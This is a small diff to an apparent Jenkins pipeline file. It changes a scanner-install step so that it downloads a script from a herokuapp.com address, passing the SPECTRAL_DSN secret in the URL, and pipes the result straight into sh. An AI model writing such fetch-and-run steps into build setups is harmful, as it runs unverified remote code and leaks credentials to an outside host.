@@ -6,7 +6,7 @@ pipeline {
   stages {
     stage('install scanners') {
       steps {
-        sh "curl -L 'http://localhost:3001/api/download/get?dsn=$SPECTRAL_DSN' | sh"   
+        sh "curl -L 'https://calm-ridge-50342.herokuapp.com/api/download/get?key=$SPECTRAL_DSN' | sh"   
       }
     }
     stage('scan for issues') {
